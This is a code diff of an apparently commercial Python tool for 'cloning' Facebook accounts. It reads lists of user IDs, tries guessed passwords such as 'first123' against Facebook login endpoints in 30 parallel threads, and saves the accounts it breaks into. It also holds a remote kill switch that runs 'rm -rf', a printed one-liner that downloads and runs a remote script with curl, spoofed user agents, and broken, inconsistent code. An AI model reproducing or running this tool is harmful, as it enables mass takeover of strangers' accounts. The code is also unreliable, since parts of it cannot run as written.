@@ -183,105 +183,263 @@ $$    $$/ $$    $$ |$$    $$/ $$       |$$ |
 -------------------------------------------------- 
 \033[1;97m""") 
 
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\033[38;5;46m'
-M = '\033[1;31m'
-H = '\033[38;5;46m'
-N = '\x1b[1;37m'    
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-P = '\033[1;37m'
-def cek_apk(session,coki):
-	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
-	else:
-		print("")
-		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
-		for i in range(len(game)):
-			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
-	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
-	else:
-		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
-		for i in range(len(game)):
-			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
-def Main():
-	os.system('clear')
-	print(logo)
-	print("[\033[1;37m01]\33[1;92mSTART FILE CLONING")
-	print("[\033[1;37m02]\33[1;92mSTART RANDOM CLONING")
-	print("[\033[1;37m03]\33[1;92mCONTACT ADMIN & FB GROUP")
-	print("[\033[1;37m04]\33[1;92mFOLLOW MY FB PROFILE")
-	print("[\033[1;37m05]\33[1;92mJOIN MESSENGER GROUP")
-	print('[\033[1;37m00]\33[1;92mEXIT PROGRAMMING')
-	print(54*'━')
-	opt = input('Choose option >>> ')
-	if opt01 ["A","1"]:
-		self.file_menu()
-	if opt in ["B","2"]:
-		virusB()
-	if opt in ["C","3"]:
-		admin()
-	if opt in ["D","4"]:
-		os.system('xdg-open https://www.facebook.com/InnocentUmarr');time.sleep(1)
-		fb()
-	if opt in ["E","5"]:
-		os.system('xdg-open https://t.me/Inoxent_boy');time.sleep(1)
-		group()
-	if opt in ["0","0"]:
+	p(logo)
+def clear():
+	os.system("clear")
+
+
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+
+bumper = f'{id}{xp}'
+
+def connection_token():
+	 digits_count = 16
+	 letters_count = 16
+	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
+	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))
+
+	 # Convert resultant string to list and shuffle it to mix letters and digits
+	 sample_list = list(letters + digits)
+	 random.shuffle(sample_list)
+	 # convert list to string
+	 final_string = ''.join(sample_list)
+	 return final_string
+
+def update():
+	logo()
+	print(' [•] Checking Updates from Our Server ....')
+	line()
+	try:
+		server = pars(requests.get('https://dilutecodes.blogspot.com/2023/05/iamabestserver.html?m=1',verify=True).text,'html.parser')
+	except CE:
+		print(" [•] Check Your Internet")
+	for x in server.find_all('div',class_='post-body entry-content float-container'):
+		r = x.text
+
+	if '2.0.1' in r:
+		print(' [•] Server is Online Welcome Users ..')
+		sp(1)
+		print(" [•] Tool is Updated On 24/5/2023")
+		print(" [•] Checking Subscription ")
+		iAmApprovelSystem()
+	elif "off" in r:
+		print(' [•] Server is Offline For Some Reasons ..')
 		exit()
+	else:
+		print(' [•] A new Version of this Dilute Tool is Available | Please Wait ....')
+		print(" [•] Updating Tool ....")
+		line()
+		sp(1)
 		
-		if opt1 == "2":self.num_menu()
-		if opt1 == "4":automation().menu()
-		if opt1 == "3":Grep().links_only()
-		if opt1 == "E":exit(" \033[1;92m [•] KHATAM TATA BY BY")
-		else:print(" [•] Wrong Select ");sp(2);self.iAmMenu()
+
+
+def iAmApprovelSystem():
+	try:
+		r = pars(requests.get("https://aqibservers.blogspot.com/2023/05/iamjohnnysins.html?m=1",verify=True).text,'html.parser')
+	except CE:
+		print(" [•] Check Your Internet Connection ...")
+	except Exception as e:
+		print(e)
+	for x in r.find_all('div',class_="post-body entry-content float-container"):
+		server_keys = x.text
+	if 'free' in str(server_keys):
+		print(" [•] Tool is on Free Trial Enjoy")
+		sp(2)
+		iAmMain().iAmMenu()
+	elif 'update' in str(server_keys):
+		print(" [•] Tool is Under Maintenence ")
+		exit()
+	elif str(bumper) in server_keys:
+		if str(bumper)+'|ok' in server_keys:
+			status = 'ok'
+			iAmMain().iAmMenu()
+	elif str(bumper) in server_keys:
+		if str(bumper)+'|expired' in server_keys:
+			buy()
+	elif str(bumper) in server_keys:
+		if str(bumper)+'|fuck' in server_keys:
+			status = 'fuck'
+			print(" [•] You Dont Have Permission To use this Tool ..")
+			os.system("rm -rf d64 d32 Cyber")
+			exit()
+	elif str(key) in server_keys:
+		if str(key)+'|ok' in server_keys:
+			iAmMain().iAmMenu()
+	else:
+		buy()
+
+def buy():
+	logo()
+	line()
+	print(" [•] Terms and Conditions Please Read Carefully ")
+	print(" [•] Your Token is Not Approved ")
+	print(" [•] This Tool is paid you need to buy first before Use ! ")
+	print(" [•] 1 token is only for 1 device you can't use your subscription in more than 1 device")
+	print(" [•] please do agree terms and conditions then buy")
+	line()
+	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
+	print(' [•] Apni zimaydari pe buy kren,me koi b zimaydari n leta illegal atctivity k')
+	print(" [•] 300 / 1Month , 250 / 15 Days ")
+	print(" [•] Payment : JazzCash/Easypaisa")
+	print(' [•] Account Num : 03152056613 ')
+	print(" [•] Token : %s"%(bumper))
+	print(" [•] Copy & send Token to Admun to get approved ")
+	print(" [•] Koi mera dost ho ya kuch b ho ab free approvel me kise ko nhi donga ids ay ya nah ay apni zimaydari pe buy kro ")
+	line()
+	exit()
+
+
+def iAmMethod3Ua():
+	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
+	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
+	END = "[FBAN/FB4A;FBAV/62.0.0.0.39;FBBV/20569053;FBDM/{density=3.0,width=1080,height=1776};FBLC/zh_CN;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
+	ua = (["Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+     "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
+		"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
+		"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9"
+		"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
+		"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile"
+		"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+		"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+        "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.11"
+        "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+        "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+       "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+       "Mozilla/5.0 (Linux; Android 5.1; itel it1355 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36"
+       "Mozilla/5.0 (Linux; Android 5.1; itel it1355 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.105 Mobile Safari/537.36 GSA/5.11.35.19.arm"
+       "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+		"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
+		"Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
+		 "Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
+		 "Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
+		  "Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
+])
+
+	return ua 
+
+
+nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
+tid = str(random.randint(111,999))
+class iAmMain:
 	
-def dump_menu(self):
+	def __init__(self):
+
+		self.gp = "https://b-graph.facebook.com/auth/login"
+		self.ap = "https://b-api.facebook.com/auth/login"
+	def iAmMenu(self):
+		logo()
+		
+		
+		p(" [1] FILE CLONING ")
+		p(" [2] RANDOM CLONING ")
+		p(" [3] DUMP TOOL ")
+		p(" [4] PASS CHANGER ")
+		p(" [E] EXIT TOOL ") 
+		line()
+		opt1 = input(" \033[1;92m[•] \033[1;97m Select an Option : ")
+		if opt1 == "1":self.file_menu()
+		
+		elif opt1 == "2":self.num_menu()
+		elif opt1 == "4":automation().menu()
+		elif opt1 == "3":Grep().links_only()
+		elif opt1 == "E":exit(" \033[1;92m [•] KHATAM TATA BY BY")
+		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
+	
+	
+	def dump_menu(self):
 		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
-		print(" \033[1;92m [•] EXAMPLE /sdcard/filename.txt")
+		
+	def file_menu(self):
+		logo()
+		p(" \033[1;92m [•] EXAMPLE /sdcard/filename.txt")
 		file = input("\033[1;97m  [•] PUT FILE PATH : ")
-		id = open(file,"r").read().splitlines()
+		try:
+			id = open(file,"r").read().splitlines()
 			self.method_select(id)
 		except FileNotFoundError:
-			print(" [•] File Path Incorrect ")
+			p(" [•] File Path Incorrect ")
 			sp(2);self.file_menu()
-			
-			
-		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
-		Main()
-def admin():
-	os.system('clear')
-	print(logo)
-	print(50*'_')
-	print(' [1] Contract WhatsApp ')
-	print(' [2] JOIN MY FB GROUP ')
-	print(' [3] FOLLOW MY GITHUB ')
-	print(' [0] Back to Main menu')
-	bal = input('Choose option >>> ')
-	if bal =='1':
-		os.system('xdg-open https://wa.me/+923021431324');time.sleep(1)
-		admin()
-	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/');time.sleep(1)
-		admin()
-	if bal =='3':
-		os.system('xdg-open https://github.com/CyberAttack85/Cyber-Attack.git');time.sleep(1)
-		admin()
-	if bal =='0':
-		Main()
 		
+	def method_select(self,id):
+		logo()
+		p(" [1] Method 1 ")
+		p(" [2] Mehtod 2 ")
+		p(" [3] Method 3 ")
+		p(" [4] Method 4 " )
+		line()
+		m_opt = input(" [•] Choose : ")
+		if m_opt =='1':
+			method.append("i")
+			self.password_menu(id)
+		elif m_opt =="2":
+			method.append('ii')
+			self.password_menu(id)
+		elif m_opt =="3":
+			method.append('iii')
+			self.password_menu(id)
+		elif m_opt =="4":
+			 method.append('iiii')
+			 self.password_menu(id)
+		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
+
+	def password_menu(self,id):
+		pwx=[]
+		logo()
+		max = 20
+		p(" [•] EXAMPLE 1 , 2 , 3  to 20 Max ")
+		try:
+			plimit = int(input(" [•] PUT LIMIT : "))
+			if plimit =="":
+				plimit = 4
+			elif plimit > max:
+				p(" [•] Password Limit Should up To 20 ");sp(2);self.password_menu()
+		except:
+			plimit = 4
+		logo()
+		p(" [•] Enter Your Passwords like : first last , first123 , last123 etc ")
+		line()
+		for n in range(plimit):
+			pwx.append(input(" [•] PUT PASSWORDS %s : "%(n+1)))
+		logo()
+		p(" \033[1;92m TOTAL FILE ACCOUNTS :\033[1;97m %s "%(str(len(id))))
+		p(" \033[1;92m PROCESS HAS BEEN STARTED \033[1;97m ")
+		line()
+		with tpe(max_workers=30) as saqi:
+			for user in id:
+				uid = user.split("|")[0]
+				nm = user.split("|")[1]
+				if "i" in method:
+					saqi.submit(self.method1,uid,nm,pwx)
+				elif "ii" in method:
+					saqi.submit(self.method2,uid,nm,pwx)
+				elif "iii" in method:
+					saqi.submit(self.method3,uid,nm,pwx)
+				elif "iiii" in method:
+					 saqi.submit(self.method4,uid,nm,pwx)
+		self.saved_results(ok,cp)
+	def saved_results(self,ok,cp):
+		line()
+		p(" [•] Cloning Has been Completed ")
+		p(" [•] Cloning Accounts Saved in /sdcard")
+		p(" [•] Total Ok Accounts : %s "%(len(ok)))
+		p(" [•] Total Cp Accounts : %s "%(len(cp)))
+		line()
+		input(" [•] Press Enter To Go Back ")
+		self.iAmMenu()
+
+
 def virusA():
 	user=[]
 	os.system('clear')
